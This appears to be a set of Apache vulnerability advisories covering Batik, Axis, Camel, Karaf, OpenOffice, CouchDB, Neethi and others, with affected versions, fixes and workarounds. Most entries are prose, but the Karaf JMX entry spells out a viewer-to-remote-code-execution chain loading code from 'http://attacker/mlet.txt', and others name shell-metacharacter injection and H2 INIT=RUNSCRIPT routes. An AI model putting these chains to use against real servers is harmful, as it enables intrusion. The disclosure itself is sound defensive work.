title: Apache XML Graphics Batik: Check url protocol when loading document
description:
Origin Validation Error vulnerability in Apache XML Graphics Batik: the external resource same-origin check does not compare the URL protocol



This issue affects Apache XML Graphics Batik: through 1.19.



Users are recommended to upgrade to version 1.20, which fixes the issue.
cwe: CWE-346 CWE-346: Origin Validation Error

title: Apache Axis 1.x (EOL): unauthenticated remote class instantiation via SOAP fault exceptionName
description:
** UNSUPPORTED WHEN ASSIGNED ** Deserialization of an inbound SOAP fault in Apache Axis 1.x allows unauthenticated remote class instantiation. When a SOAP <Fault> carries a <detail><exceptionName> element, Axis loads the named class and, if a String <data> element is also present, instantiates it through its String constructor before checking that it is an AxisFault. Loading alone runs the class's static initializer. With a suitable class on the application's classpath this leads to remote code execution. The fault is parsed while the engine resolves the target service, before any per-service handler chain runs, so authentication handlers configured on a service do not protect against it. This affects all Apache Axis 1.x versions through 1.4.



As Axis 1 has been EOL we recommend you migrate to a different SOAP engine, such as Apache Axis 2/Java. Alternatively you could use a build of Axis with the patch from https://github.com/apache/axis-axis1-java/commit/41f3b4e8d04e310ca81f86b92630ab2c11d608bd applied. The Apache Axis project does not expect to create an Axis 1.x release fixing this problem.
cwe: CWE-470 CWE-470 Use of Externally-Controlled input to select classes or code ('unsafe reflection')

title: Apache Thrift: An exception escaping a libevent callback stops the D library's non-blocking server, allowing an unauthenticated remote attacker to deny service
description:
Uncaught exception, improper handling of exceptional conditions, improper resource shutdown vulnerability in Apache Thrift D thrift.server.nonblocking.TNonblockingServer.



This issue affects Apache Thrift: before 0.25.0.



Users are recommended to upgrade to version 0.25.0, which fixes the issue.
cwe: CWE-248 CWE-248 Uncaught exception
CWE-755 CWE-755 improper handling of exceptional conditions
CWE-404 CWE-404 improper resource shutdown

title: Apache Impala: Path traversal executes JARs outside trusted paths
description:
Path traversal of 'trusted_jar_paths' in Impala 4.5.2 allows an attacker-controlled JAR to be loaded via a relative path where the prefix matches a path specified in 'trusted_jar_paths'.




The startup flag 'trusted_jar_paths' references URIs for loading files from local or remote filesystems. Path traversal can't override the schema, but can result in loading a JAR that has been uploaded to a different location in that filesystem via Impala DDLs such as CREATE DATA SOURCE and CREATE TABLE. Path traversal can only be used if a trusted path exists, so this attack requires 'trusted_jar_paths' have a non-empty value configured by the Impala admin.




Users are recommended to upgrade to version 4.5.3, which fixes this issue.
cwe: CWE-23 CWE-23 Relative path traversal

title: Apache bRPC: Null pointer dereference in MySQL reply parser leading to client crash
description:
The MySQL client response parser in Apache bRPC dereferences a null pointer when the server peer sends a zero-payload-length response packet. A response packet whose declared payload length is zero is accepted by the frame-length check (is_full_package), after which the parser reads the response type byte via an unbounded 5-byte fetch that returns nullptr, and type = p[4] dereferences it, crashing the client process.



Root Cause: In brpc::policy::MysqlReply::ConsumePartialIOBuf, buf.fetch(header, 5) returns nullptr when the buffered data only holds the 4-byte header of a zero-length packet, then the code reads p[4] (and, in the fast-auth path, p2[4]) without checking for a null or zero-length packet.



Affected Scenarios: A brpc MySQL client connecting to a malicious or compromised MySQL server (or a MITM) can be crashed by a zero-length server response packet, resulting in denial of service of the client.



Fix: The fix rejects zero-length response packets (returning PARSE_ERROR_ABSOLUTELY_WRONG) both for the initial response type determination and after a fast-auth marker, before reading the type byte. Upgrade to the Apache bRPC version 1.18.0 or apply the PR patch at https://github.com/apache/brpc/pull/3536.
cwe: CWE-476 CWE-476 NULL Pointer Dereference

title: Apache OpenOffice: PDF File Parsing Heap based Buffer-Overflow-Remote Code Execution Vulnerability
description:
An unchecked memory access in the PDF import code of Apache OpenOffice versions through 4.1.16 on allows a crafted PDF to execute an out-of-bounds memory write. This could crash the program or cause memory corruption.
Users are recommended to upgrade to version 4.1.17, which fixes this issue.
cwe: CWE-787 CWE-787 Out-of-bounds write
credits: Anonymous working with TrendAI Zero Day Initiative

title: Apache OpenOffice: Out-of-bounds write when importing encrypted PDF files
description:
An uncontrolled memory access in the PDF import code of Apache OpenOffice versions through 4.1.16 allows a crafted PDF to cause an out-of-bounds memory write, causing program crash or memory corruption.
Users are recommended to upgrade to version 4.1.17, which fixes this issue.

title: Apache OpenOffice: Local file inclusion via SQL provider and flat file database references
description:
The flat file database driver in Apache Openoffice versions through 4.1.16 allows a crafted document to read the contents of any local file without asking the user.
Users are recommended to upgrade to version 4.1.17, which fixes this issue.
cwe: CWE-552 CWE-552 Files or directories accessible to external parties
credits: Edoardo Geraci and Thomas Rinsma of Codean Labs

title: Apache OpenOffice: Stack overflow in CFF hint handling
description:
An uncontrolled memory access in the PDF export code of Apache OpenOffice versions through 4.1.16 allows a crafted CFF font to cause a stack overflow problem, causing program crash or memory corruption, or even running other code.

Users are recommended to upgrade to version 4.1.17, which fixes this issue.
cwe: CWE-121 CWE-121 Stack-based buffer overflow

title: Apache OpenOffice: Out of bounds memory access during WMF import
description:
An uncontrolled memory access in the WMF import code of Apache OpenOffice versions through 4.1.16 allows a crafted WMF file to cause an invalid memory access, causing program crash or memory corruption.
Users are recommended to upgrade to version 4.1.17, which fixes this issue.

title: Apache OpenOffice: Remote document loaded without prompt, possibiy leaking environment variables
description:
Apache OpenOffice documents can contain links. A missing Authorization vulnerability in Apache OpenOffice allowed an attacker to craft a document that would cause external links 
to be loaded without prompt, possibly transferring the contents of environment variables in the process.



This issue affects Apache OpenOffice: through 4.1.16.



Users are recommended to upgrade to version 4.1.17, which fixes the issue.
cwe: CWE-939 CWE-939 Improper authorization in handler for custom URL scheme
credits: Edoardo Geraci and Thomas Rinsma of Codean Labs

title: Apache OpenOffice: Local file inclusion via GStreamer plugin
description:
Apache OpenOffice documents can include multimedia content (audio, video, etc.)

A crafted document could exploit the GStreamer multimedia component of Apache OpenOffice version through 4.1.16 to load the contents of any local file, and include them when the document is saved or exported, for example as PDF.

Users are recommended to upgrade to version 4.1.17, which fixes this issue.
cwe: CWE-552 CWE-552 Files or directories accessible to external parties
credits: Edoardo Geraci and Thomas Rinsma of Codean Labs

title: Apache OpenOffice: Out-of-bounds write when importing encrypted PDF files
description:
An uncontrolled memory access in the PDF import code of Apache OpenOffice versions through 4.1.16 allows a crafted PDF to cause an out-of-bounds memory write, causing program crash or memory corruption.
Users are recommended to upgrade to version 4.1.17, which fixes this issue.
cwe: CWE-787 CWE-787 Out-of-bounds write
credits: Anonymous working with TrendAI Zero Day Initiative

title: Apache CouchDB: Pre-authentication gzip decompression bomb via POST /_session
description:
An unlimited gzip decompression routine in chttpd in Apache CouchDB 3.5.2 and below on all platforms allows any remote client to cause a denial of service via memory exhaustion.
Users are recommended to upgrade to version 3.5.3, which fixes this issue.
cwe: CWE-409 CWE-409 Improper Handling of Highly Compressed Data (Data Amplification)

title: Apache CouchDB: Replicator follows redirects indefinitely
description:
A missing circuit-breaker in the replicator in Apache CouchDB 3.5.2 and below on all platforms allows the owner of a replication source or target to cause a denial of service via creating an infinite HTTP redirect loop.

Users are recommended to upgrade to version 3.5.3, which fixes this issue.
cwe: CWE-834 CWE-834 Excessive Iteration

title: Apache CouchDB: Atom-table exhaustion in _changes sequences and _search bookmarks with specially crafted sequence values
description:
Unsafe binary deserialisation in chttpd in Apache CouchDB 3.5.2 and below on all platforms allows an authenticated user to cause a denial of service via memory exhaustion.

Users are recommended to upgrade to version 3.5.3, which fixes this issue.
cwe: CWE-502 CWE-502 Deserialization of Untrusted Data
credits: Piotr Karwasz & ZeroVuln Labs reported this issue independently

title: Apache CouchDB: Auth bypass in prefixed _users and _replicator databases
description:
Missing authorisation checks in chttpd in Apache CouchDB 3.5.2 and below on all platforms allows any request to read the full contents of a prefixed _user or _replicator database via an unauthorised API endpoint.


The use of prefixed system databases is very rare.

Users are recommended to upgrade to version 3.5.3, which fixes this issue.
cwe: CWE-862 CWE-862 Missing Authorization
credits: Qing Xu & ZeroVuln Labs reported this issue independently

title: Apache Camel: Camel-Saxon XML External Entity Processing - XQueryBuilder Parsed a Message Body That Was Already a javax.xml.transform.Source With Saxon's Default Parser Settings, so an External Entity Declared in That Body Was Resolved
description:
Improper Restriction of XML External Entity Reference vulnerability in Apache Camel Saxon component.



This issue affects Apache Camel: from 4.0.0 before 4.18.5, from 4.19.0 before 4.22.2.



XQueryBuilder in camel-saxon, which evaluates expressions for the xquery language and the xquery component, built its default Saxon Configuration with parse options that set only a whitespace stripping rule, leaving the XML parser at its defaults, under which a DOCTYPE declaration is accepted and external entities are resolved. A message body of type String or byte[], or any body read as an InputStream, is first turned into a javax.xml.transform.Source by Camel's own XML type converters, which configure the parser against external entities, so those bodies were not affected. A body that was already a Source, however, was handed to Saxon unchanged, and when that Source still had to be parsed, as a stream-based Source does, Saxon parsed it with that Configuration, bypassing the protection applied to the other body types. Such a body arises, for example, after a route converts the message with convertBodyTo(Source.class), or when a component or processor earlier in the route sets the body to a stream-based Source. A DOCTYPE with an external subset, or an external entity, declared in that body was therefore resolved and expanded into the document the expression was evaluated against. An external sender whose XML reaches an XQuery expression or an xquery endpoint in that form could read files readable by the Camel process and cause the process to issue requests to hosts the document names. No non-default option is required, since the default Configuration is used whenever the route does not supply one of its own.



Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.2. If users are on the 4.18.x releases stream, then they are suggested to upgrade to 4.18.5. The 4.14.x releases stream and earlier, as well as the 4.15.x to 4.17.x and 4.19.x to 4.21.x release lines, reached end of life before this issue was resolved and will not receive a fix, so deployments on them must move to a supported release. For deployments that cannot upgrade immediately, do not evaluate XQuery over a message body that is already a javax.xml.transform.Source when that body carries XML from an untrusted sender, or set the configuration option of the xquery endpoint or language to a Saxon Configuration whose parse options refuse a DOCTYPE declaration and disable external entities and external DTD loading, which is what the fixed releases now apply by default.
cwe: CWE-611 CWE-611 Improper Restriction of XML External Entity Reference

references.name: Backport to camel-4.18.x, released in 4.18.5 (commit ed513f3a7117c3343a9e31e22e5627498f2fcdb6)
CVE-2026-85250, the camel-xpath documentType=InputSource XXE, distinct from this issue

solutions: Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.2. If users are on the 4.18.x releases stream, then they are suggested to upgrade to 4.18.5. XQueryBuilder now builds its default Saxon Configuration with parse options that refuse a DOCTYPE declaration and disable external general entities, external parameter entities and external DTD loading, aligning a body that is already a javax.xml.transform.Source with the hardened parser configuration that Camel's XmlConverter applies to String, byte[] and InputStream bodies. A body that reaches XQuery as an already-built Source and carries a DOCTYPE declaration is now rejected with a parse error. A Configuration supplied through the configuration option of the xquery endpoint or language is used as is and is not modified. The 4.14.x releases stream and earlier, as well as the 4.15.x to 4.17.x and 4.19.x to 4.21.x release lines, reached end of life before this issue was resolved and will not receive a fix, so deployments on them must move to a supported release.
workarounds: For deployments that cannot upgrade immediately, do not evaluate XQuery over a message body that is already a javax.xml.transform.Source when that body carries XML from an untrusted sender. Alternatively, set the configuration option of the xquery endpoint or language to a Saxon Configuration whose parse options refuse a DOCTYPE declaration and disable external entities and external DTD loading, which is what the fixed releases now apply by default.

title: Apache Answer: Reaction API authorization bypass for restricted content
description:
Missing authentication for critical function vulnerability in Apache Answer.



This issue affects Apache Answer: through 2.0.2.



The reaction API did not enforce content visibility controls, allowing unauthorized users to read reaction metadata from restricted content or add and remove their own reactions.



Users are recommended to upgrade to version 2.0.3, which fixes the issue.
cwe: CWE-306 CWE-306 Missing authentication for critical function

title: Apache Karaf: LDAP filter injection in JAAS LDAP login modules
description:
LDAPCache and LDAPBackingEngine build LDAP search filters for user lookup and role lookup by textually substituting the placeholders %u, %dn, and %fqdn (drawn from the login name, the resolved user DN, and its fully qualified namespace form) into administrator-configured filter templates (userFilter, roleFilter). Before the fix, the only sanitization applied to the substituted value was double backslashed:

filter = filter.replaceAll(Pattern.quote("%u"), Matcher.quoteReplacement(user));

filter = filter.replace("\\", "\\\\");




This does not escape the other characters RFC 4515 requires escaping in an LDAP search filter: *, (, ), and NUL. A login name containing any of these can change the structure of the resulting filter rather than being matched as a literal value (e.g. a crafted username can turn an equality match into a wildcard match, or close/reopen filter clauses), widening what the search returns and potentially causing a login or role lookup to match an LDAP entry other than the intended one, over-granting roles, and depending on deployment-specific filter templates, potentially affecting which account a login resolved to.




It's not exploitable through every entry points: LDAPLoginModule and LDAPPubkeyLoginModule both called Util.doRFC2254Encoding() (correct RFC 4515 escaping) on the login name before handing it to LDAPCache, which masked the missing escaping in LDAPCache for those two call paths. Using LDAPCache directly (bypassing the login modules) does not reproduce through the normal LDAPLoginModule/LDAPPubkeyLoginModule authentication flow for this reason. It does reproduce through two other call paths that reach LDAPCache/LDAPBackingEngine without any prior escaping:

  *  GSSAPILdapLoginModule passes the NameCallback name straight through, unescaped.
  *  LDAPBackingEngine (listRoles) passes principal.getName() straight through, unescaped.
cwe: CWE-90 CWE-90 Improper neutralization of special elements used in an LDAP query ('LDAP injection')

title: Apache Karaf: OS Command Injection in Child-Instance Launch (instance:* / InstancesMBean)
description:
Apache Karaf's instance-management service (InstanceServiceImpl) builds the command line used to launch a child Karaf JVM by string concatenation, then executes it through /bin/sh (Unix) or cscript (Windows). The caller-supplied javaOpts value is spliced into that string unquoted. A javaOpts value containing shell metacharacters (;, |, `, $(...)) is interpreted by the shell instead of being passed to the JVM as an option, giving arbitrary OS command execution as the Karaf process user.


Reachable via the shell commands instance:create, instance:start, instance:restart, instance:change-opts, and the equivalent InstanceMBean JMX operations (createInstance, startInstance, changeJavaOpts, cloneInstance).

Mitigation   *  Set karaf.secured.command.compulsory.roles=admin in etc/system.properties to close the fail-open gap for all unconfigured command scopes.
  *  Restrict which principals can reach instance:* commands and InstancesMBean via etc/users.properties role assignments.
  *  Treat javaOpts passed to instance:create/instance:start/instance:change-opts/InstancesMBean as untrusted input only from fully-trusted operators.
cwe: CWE-78 CWE-78 Improper neutralization of special elements used in an OS command ('OS command injection')

title: Apache Karaf: Path Traversal in Config Service Allows Manager-to-Admin Privilege Escalation
description:
org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),
which backs the "config" MBean and the config:* shell commands, derives the file
it writes a configuration to from caller-supplied input without checking that
the result stays inside ${karaf.etc}:

  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;
  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + ".cfg")), so a PID containing ".." segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.


Both code paths are reachable by any caller holding the "manager" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: "update = manager"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to "admin" (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.






ConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains("..") string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all.
cwe: CWE-22 CWE-22 Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

title: Apache Karaf: Missing authorization on the jdbc:* shell command scope allows privilege escalation to remote code execution via jdbc:ds-create
description:
The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an "admin misconfiguration".


The same applies to jms:* shell commands.
cwe: CWE-862 CWE-862

title: Apache Karaf: config:install missing ACL entry allows privilege escalation to admin
description:
Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (etc/org.apache.karaf.command.acl.<scope>.cfg). SecuredSessionFactoryImpl.checkSecurity() resolves the roles required for an invocation and, when no ACL rule matches the command, fails open: ACLConfigurationParser.Specificity.NO_MATCH sets passCheck = true. The safety valve for this, karaf.secured.command.compulsory.roles, ships commented out in etc/system.properties, so an unmatched command is allowed for any authenticated user.


The shipped org.apache.karaf.command.acl.config ACL (assemblies/features/standard/src/main/feature/feature.xml, mirrored into instance/.../etc/org.apache.karaf.command.acl.config.cfg) has no install entry. It restricts delete to admin, restricts edit/property-*/update on the jmx.acl.*, org.apache.karaf.command.acl.* and org.apache.karaf.service.acl.* PIDs to admin, and allows manager for everything else, but config:install was simply unmatched, and therefore allowed for any authenticated user, including one holding only the viewer role.




config:install <url> <finalname> fetches url and writes it into ${karaf.etc} as finalname. It calls PathUtils.checkWithin() to block .. traversal outside karaf.etc, but that folder holds every security-relevant file Karaf ships: users.properties, keys.properties, host.key, and all org.apache.karaf.*.acl.* files, including the very ACL file that (mis)governs this command. With -o/--override, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.




Because felix.fileinstall.dir = ${karaf.etc} (etc/config.properties), Felix FileInstall also watches and reloads any .cfg file dropped there, closing the loop without requiring a restart.




By contrast, bundle:install, feature:install and kar:install are all admin-only in their own ACLs, and config:delete is admin in this same ACL, config:install was the outlier.

MitigationAdd install = admin in etc/org.apache.karaf.command.acl.config.cfg (create the file is absent), and/or set karaf.secured.command.compulsory.roles=admin in etc/system.properties (and restart) to make unmatched commands fail closed by default.
cwe: CWE-862 CWE-862

title: Apache Thrift: C++ `THeaderTransport::transform()` heap buffer overflow (write direction)
description:
Heap-based buffer overflow vulnerability in Apache Thrift C++ THeaderTransport.



When an application enables the ZLIB transform for the frames it sends, THeaderTransport::transform() copies the compressed frame into the write buffer without making sure it fits. Data that does not compress, such as content a remote peer supplied, grows under compression, so the copy writes past the end of the heap buffer by an amount that grows with the size of the frame, and for large frames it also reads past the end of the transform buffer.



This issue affects Apache Thrift: before 0.25.0.



Users are recommended to upgrade to version 0.25.0, which fixes the issue.
cwe: CWE-122 CWE-122 Heap-based buffer overflow

title: Apache Roller: Stored javascript: URI in HTML comments
description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in Apache Roller 6.1.5 allows an anonymous remote attacker to store a comment containing a javascript: URI link that survives HTML comment formatting and can execute script in the browser of a visitor who clicks it. This affects only sites that enable HTML in comments (users.comments.htmlenabled=true) together with the HTMLSubset comment formatter; comment moderation, where enabled, delays publication. Users are recommended to upgrade to Apache Roller 6.1.6 or later, which restricts restored links to http, https and mailto URIs.
cwe: CWE-79 CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

title: Apache Roller: Reflected XSS in the optional LDAP comment authenticator
description: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') in Apache Roller 6.1.5 allows a remote attacker to perform reflected cross-site scripting through the optional LDAP comment authenticator, which writes request parameter values into its HTML form without escaping. This affects only sites configured to use LdapCommentAuthenticator, and a victim whose session has already loaded the authenticator form must follow a crafted link. Users are recommended to upgrade to Apache Roller 6.1.6 or later, which escapes the reflected values.
cwe: CWE-79 CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

title: Apache Camel: Camel-FOP Resolves External DTDs and Entities From Untrusted XSL-FO Input When a Third-Party JAXP TransformerFactory Is Present
description: FopProducer transforms the incoming XSL-FO message body by creating a javax.xml.transform.TransformerFactory through TransformerFactory.newInstance() and enabling only FEATURE_SECURE_PROCESSING before running an identity transform over the body. On the JDK's built-in transformer, that feature alone already empties the accessExternalDTD and accessExternalStylesheet limits, so an external DTD or entity is refused. When a third-party JAXP TransformerFactory such as Saxon-HE is on the classpath, for example because the application also uses camel-xslt-saxon or camel-saxon, TransformerFactory.newInstance() returns that implementation instead, and FEATURE_SECURE_PROCESSING on its own does not restrict external resource access on it. A DOCTYPE with an external subset, or an external general entity, declared in the XSL-FO document is then resolved and expanded while the body is transformed. An external sender whose XSL-FO reaches a fop producer could therefore read files readable by the Camel process and cause the process to issue requests to hosts the document names. camel-fop does not bring such a factory itself, and excludes Xalan, so a default deployment using the JDK transformer is not affected; the issue is reachable only where another component has placed an alternative JAXP TransformerFactory on the classpath. Releases on the 4.14.x line and earlier reached end of life before this issue was resolved and do not receive a fix.
cwe: CWE-611 CWE-611 Improper Restriction of XML External Entity Reference

references.name: Backport to camel-4.22.x, released in 4.22.1 (commit f689a9c92f0e6c406f9a0256c7d940024cf56782)

solutions: Users are recommended to upgrade to version 4.23.0, which fixes the issue. If users are on the 4.22.x releases stream, then they are suggested to upgrade to 4.22.1. If users are on the 4.18.x releases stream, then they are suggested to upgrade to 4.18.5. FopProducer now also sets ACCESS_EXTERNAL_DTD and ACCESS_EXTERNAL_STYLESHEET to the empty string on the TransformerFactory it creates, in addition to FEATURE_SECURE_PROCESSING, matching the secure XML processing configuration used by org.apache.camel.converter.jaxp.XmlConverter, so external DTD and stylesheet access is refused on any JAXP implementation that honours those attributes. The 4.14.x releases stream and earlier reached end of life before this issue was resolved and will not receive a fix, so deployments on those lines must move to a supported release.
workarounds: For deployments that cannot upgrade immediately, do not send untrusted XSL-FO to a fop producer. Alternatively, remove the third-party JAXP TransformerFactory such as Saxon-HE from the classpath, so that the JDK's built-in transformer is used, which already refuses external DTDs and external entities when secure processing is enabled.

title: Apache Neethi: Uncontrolled recursion while parsing crafted WS-Policy documents allows denial of service
description:
A specially crafted WS-Policy document with deeply nested policy elements can bypass Neethi's nesting-depth limit and exhaust the thread stack, crashing the parser (denial of service).
Users are recommended to upgrade to version 3.2.4, which fixes this issue.
cwe: CWE-674 CWE-674 Uncontrolled Recursion
credits: This issue was found using Claude agents to study the security of open-source projects

title: Apache Neethi: Crafted WS-Policy documents bypass element/attribute limits causing memory exhaustion
description:
A specially crafted WS-Policy document can pack unlimited content inside a policy assertion, which Neethi copies into memory without counting it against its size limits, exhausting the heap (denial of service).
Users are recommended to upgrade to version 3.2.4, which fixes this issue.
cwe: CWE-770 CWE-770 Allocation of Resources Without Limits or Throttling
credits: This issue was found using Claude agents to study the security of open-source projects

title: Apache Neethi: Crafted policy references cause exponential expansion during normalization leading to denial of service

A small WS-Policy document using repeated policy references can force Neethi to re-expand the same references exponentially during normalization, consuming huge amounts of CPU and memory (denial of service).
Users are recommended to upgrade to version 3.2.4, which fixes this issue.
cwe: CWE-770 CWE-770 Allocation of Resources Without Limits or Throttling

title: Apache Neethi: Crafted policies cause unbounded work during intersection leading to denial of service
description:
A specially crafted pair of WS-Policy documents can force Neethi's policy-intersection to do exponential amounts of work, pinning the CPU for a long time (denial of service).
Users are recommended to upgrade to version 3.2.4, which fixes this issue.
cwe: CWE-770 CWE-770 Allocation of Resources Without Limits or Throttling
credits: This issue was found using Claude agents to study the security of open-source projects

title: Apache Neethi: Remote policy fetch lacks a total timeout, allowing a slow server to hang the request indefinitely
description:
When Neethi fetches a remote policy reference, it only limits the time per read, not the whole transfer, so a server that trickles bytes slowly can keep the fetch alive indefinitely and tie up the calling thread (denial of service).
Users are recommended to upgrade to version 3.2.4, which fixes this issue.
cwe: CWE-400 CWE-400 Uncontrolled Resource Consumption
credits: This issue was found using Claude agents to study the security of open-source projects

title: Apache WSS4J: WS-SecurityPolicy signature checks skipped in the streaming code after an STR-Transform reference
description:
In the WSS4J streaming (StAX) code, a signature reference using the WS-Security STR-Transform leaves an internal "inside signed content" flag permanently set. The WS-SecurityPolicy enforcer uses that flag to decide whether an element needs checking, so it stops evaluating SignedParts and SignedElements for the rest of the message. A policy requiring the SOAP Body to be signed is then satisfied even when the Body carries no signature, removing the protection against XML Signature Wrapping. Signature verification itself is unaffected. The DOM code is not affected. 
Users are recommended to upgrade to versions 4.0.2 or 3.0.6 or 2.4.4 which fix this issue.
cwe: CWE-693 CWE-693 Protection Mechanism Failure

title: Apache Karaf: Authorization bypass in JMX MBean lifecycle operations
description:
Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:


  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList("invoke", "getAttribute", "getAttributes", "setAttribute", "setAttributes"));




The MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.




As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged "viewer" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).




This is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing "invoke" check, but the default etc/jmx.acl.cfg grants the "viewer" role to any method name matching the wildcard rule "get* = viewer", a heuristic intended for read-only getters. Because "getMBeansFromURL" happens to start with "get", it also matches that rule, so a default installation grants "viewer" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a "viewer"-role JMX client a path to remote code execution to the Karaf JVM:

  *  Authenticate to JMX as any user with any role (e.g. "viewer").
  *  mbs.createMBean("javax.management.loading.MLet", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.
  *  mbs.invoke(objectName, "getMBeansFromURL", new Object[]{"http://attacker/mlet.txt"}, ...) is guarded, but the method name matches the default "get* = viewer" ACL rule, so permitted.
  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.
  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.


The fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the "admin" role. This allows deployments to also write class-name-specific rule, e.g.:




createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin




Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-"admin" JMX credentiels.
cwe: CWE-862 CWE-862

title: Apache Airflow Keycloak provider: Keycloak multi-team provisioning grants every team role global audit-log read
description:
The Apache Airflow Keycloak provider's multi-team provisioning (`_attach_team_permissions`) granted every team role global read access to audit logs. Deployments that enable multi-team mode with the Keycloak auth manager and provision teams through it are affected: any authenticated member of one team could read other teams' audit events through the UI or the event-log API.

Users of apache-airflow-providers-keycloak are recommended to upgrade to apache-airflow-providers-keycloak 0.11.1 or later.
cwe: CWE-732 CWE-732: Incorrect Permission Assignment for Critical Resource

title: Apache Karaf: Improper release of ClassLoader references via static ThreadLocal caching
description: Apache Karaf's XmlUtils cached XML parser/transformer factories in static ThreadLocal fields on long-lived container threads. Because a ThreadLocal value outlives the OSGi bundle that created it, repeated bundle or feature install, update, or refresh operations can leave successive bundle ClassLoader's pinned in memory and unreachable for garbage collection, leading to unbounded Metaspace growth and eventual denial of service of the Karaf instance.
cwe: CWE-401 CWE-401 Missing release of memory after effective lifetime
CWE-772 CWE-772 Missing release of resource after effective lifetime

title: Apache Arrow C++, PyArrow: Parquet file-controlled KMS URL is forwarded to pluggable KmsClient that skips host validation
description:
Pass-through of unvalidated KMS URLs to KMS clients in Apache C++ Parquet and PyArrow versions 4.0.0 to 25.0.1.




This affects users who read Parquet files and configure Parquet decryption properties with a KmsClient implementation.




On the reader side, the KMS URL can be application-controlled (specified in the KmsConnectionConfig) or file-controlled.
If the user does not leverage application control for this parameter, a file-controlled KMS URL is forwarded to a pluggable KmsClient implementation. 
If the KMS implementation does not perform host validation and makes use of the provided KMS URL, a KMS token can be sent to a malicious host set by an attacker in the file. 




Users are recommended to upgrade to version 26.0.0, which disables this behavior by default and requires that users opt-in to it by enabling the read_kms_url flag in the DecryptionConfiguration. Users of affected versions are recommended to either specify the KMS URL in the KmsConnectionConfig when reading files, or ensure any KmsClient implementations validate received KMS URLs. Users that opt-in to file-controlled KMS URLs in version 26.0.0 and later must ensure KmsClients validate KMS URLs.
cwe: CWE-20 CWE-20 Improper input validation

title: Apache YuniKorn: Admission control bypass via workload UPDATE operation
description:
Apache YuniKorn 1.9.0 and earlier does not implement label and user annotation checks for workload UPDATE action bypassing all checks. Workloads in YuniKorn are defined as the following Kubernetes objects: "deployments", "replicasets", "statefulsets", "daemonsets", "jobs", "cronjobs". The CREATE action correctly enforces the checks for all object types.


The bypass allows any user to specify an arbitrary user info annotation. The same bypass also allows changing the application ID for the workload. The combination of the two applied in one UPDATE could allow access to a queue that the user normally would not have access to. Quota usage for the queue might be impacted if the application runs in the incorrect queue. User based quota enforcement is also based on the user annotation. User quota tracking could be side stepped even if the application runs in the correct queue.




Users are recommended to upgrade to version 1.10.0, which fixes this issue.
cwe: CWE-863 CWE-863 Incorrect Authorization

title: Apache Jackrabbit: Pre-auth hijack of cached sessions via derivable WebDAV lock tokens
description:
: Session Fixation / Session Reuse across Users vulnerability in Apache Jackrabbit.



